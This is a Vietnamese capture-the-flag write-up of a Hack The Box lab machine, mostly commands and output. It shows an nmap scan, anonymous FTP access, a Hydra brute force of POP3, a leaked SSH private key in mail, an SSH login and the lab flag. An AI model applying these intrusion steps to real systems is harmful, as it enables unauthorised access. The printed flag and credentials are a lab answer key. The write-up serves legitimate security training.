<img width="1088" height="808" alt="image" src="https://github.com/user-attachments/assets/49049dd9-8c16-4b5e-851a-ba37b16c930e" />

Target là `10.129.201.127`, tôi dùng lệnh nmap để scan các port có trên mục tiêu:

```
sudo nmap 10.129.201.127 -Pn -sV -sC -p- --min-rate=200 -T 4 -oN mediumlab -v
```

Và kết quả đây:

```
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp    open  domain       ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp   open  pop3         Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-04-11T16:38:55
| Not valid after:  2032-04-08T16:38:55
| MD5:     a03e afe0 3b9e 242f 45ce 81ea 9205 485b
| SHA-1:   f95b c0ca f558 d268 5442 7213 80b6 ec09 2df5 55c0
|_SHA-256: d805 e97e 6bb7 0566 9929 f813 0e47 b059 95db ece5 89d6 e163 894c e4e5 db43 b361
995/tcp   open  ssl/pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-04-11T16:38:55
| Not valid after:  2032-04-08T16:38:55
| MD5:     a03e afe0 3b9e 242f 45ce 81ea 9205 485b
| SHA-1:   f95b c0ca f558 d268 5442 7213 80b6 ec09 2df5 55c0
|_SHA-256: d805 e97e 6bb7 0566 9929 f813 0e47 b059 95db ece5 89d6 e163 894c e4e5 db43 b361
2121/tcp  open  ccproxy-ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.201.127]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
30021/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Internal FTP) [10.129.201.127]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative

```

Thử đăng nhập vào ftp ở anonymus đối với port 2121 và 30021 thì 30021 có file mynotes.txt và nhìn khá giống mật khẩu của user simon:

```
❯ lftp -p 30021 -u anonymous,anonymous@ 10.129.201.127
lftp anonymous@10.129.201.127:~> ls
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
lftp anonymous@10.129.201.127:/> cd simon
lftp anonymous@10.129.201.127:/simon> ls
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
lftp anonymous@10.129.201.127:/simon> get mynotes.txt
get: /home/namdeptrai/road_to_hecker/mynotes.txt: file already exists and xfer:clobber is unset
lftp anonymous@10.129.201.127:/simon> quit
❯ cat mynotes.txt
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

Và crack được mật khẩu là:

```
❯ hydra -l simon -P mynotes.txt -f 10.129.201.127 pop3
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-04 08:39:45
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking pop3://10.129.201.127:110/
[110][pop3] host: 10.129.201.127   login: simon   password: 8Ns8j1b!23hs4921smHzwn
[STATUS] attack finished for 10.129.201.127 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-04 08:39:48
```

Kết nối vào ftp thì có cái file nhìn như key ssh:

```
❯ openssl s_client -crlf -quiet -connect 10.129.201.127:995
Connecting to 10.129.201.127
Can't use SSL_get_servername
depth=0 CN=ubuntu
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=ubuntu
verify return:1
+OK Dovecot (Ubuntu) ready.
USER simon
+OK
PASS 8Ns8j1b!23hs4921smHzwn
+OK Logged in.
LIST
+OK 1 messages:
1 1630
.
RETR 1
+OK 1630 octets
From admin@inlanefreight.htb  Mon Apr 18 19:36:10 2022
Return-Path: <root@inlanefreight.htb>
X-Original-To: simon@inlanefreight.htb
Delivered-To: simon@inlanefreight.htb
Received: by inlanefreight.htb (Postfix, from userid 0)
	id 9953E832A8; Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
Subject: New Access
To: <simon@inlanefreight.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20220418193610.9953E832A8@inlanefreight.htb>
Date: Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
From: Admin <root@inlanefreight.htb>

Hi,
Here is your new key Simon. Enjoy and have a nice day..

 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== -----END OPENSSH PRIVATE KEY-----

.
QUIT
+OK Logging out.
```

Dùng ssh vào bằng mật khẩu cũng được:

```
❯ ssh simon@10.129.201.127
The authenticity of host '10.129.201.127 (10.129.201.127)' can't be established.
ED25519 key fingerprint is: SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:36: 10.129.63.245
    ~/.ssh/known_hosts:38: 10.129.32.86
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.201.127' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
simon@10.129.201.127's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 04 Nov 2025 01:45:32 AM UTC

  System load:  0.0                Processes:               222
  Usage of /:   16.7% of 13.72GB   Users logged in:         0
  Memory usage: 12%                IPv4 address for ens160: 10.129.201.127
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


No mail.
Last login: Wed Apr 20 14:32:33 2022 from 10.10.14.20
simon@lin-medium:~$ ls
flag.txt  Maildir
simon@lin-medium:~$ cat flag.txt 
HTB{1qay2wsx3EDC4rfv_M3D1UM}
simon@lin-medium:~$ 

```


















